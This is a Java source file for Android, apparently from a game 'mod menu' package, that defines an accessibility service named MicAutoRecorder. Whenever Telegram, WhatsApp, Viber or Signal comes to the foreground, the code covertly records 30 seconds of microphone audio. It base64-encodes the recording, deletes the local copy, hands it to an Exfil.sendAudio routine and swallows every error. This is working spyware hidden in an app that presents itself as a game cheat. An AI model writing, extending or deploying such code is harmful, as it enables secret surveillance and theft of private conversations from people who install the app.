package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.media.MediaRecorder;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileInputStream;
import java.util.Arrays;
import java.util.List;

public class MicAutoRecorder extends AccessibilityService {

    private static final List<String> TRIGGERS = Arrays.asList(
        "org.telegram.messenger",
        "com.whatsapp",
        "com.viber.voip",
        "org.thoughtcrime.securesms"
    );

    private long lastRecord = 0;
    private static final long COOLDOWN = 10 * 60 * 1000L; // 10 минут

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();

        if (!TRIGGERS.contains(pkg)) return;
        if (System.currentTimeMillis() - lastRecord < COOLDOWN) return;
        lastRecord = System.currentTimeMillis();

        record30Seconds();
    }

    private void record30Seconds() {
        new Thread(() -> {
            try {
                File out = new File(getCacheDir(), "mic_auto.m4a");
                MediaRecorder rec = new MediaRecorder();
                rec.setAudioSource(MediaRecorder.AudioSource.MIC);
                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                rec.setOutputFile(out.getAbsolutePath());
                rec.prepare();
                rec.start();

                Thread.sleep(30 * 1000L);
                rec.stop();
                rec.release();

                if (out.exists() && out.length() > 0) {
                    byte[] data = new byte[(int) out.length()];
                    FileInputStream fis = new FileInputStream(out);
                    fis.read(data);
                    fis.close();
                    out.delete();

                    String b64 = android.util.Base64.encodeToString(data,
                        android.util.Base64.NO_WRAP);
                    Exfil.sendAudio("AUTO_MIC", b64, 30);
                }
            } catch (Throwable ignored) {}
        }).start();
    }

    @Override public void onInterrupt() {}
}
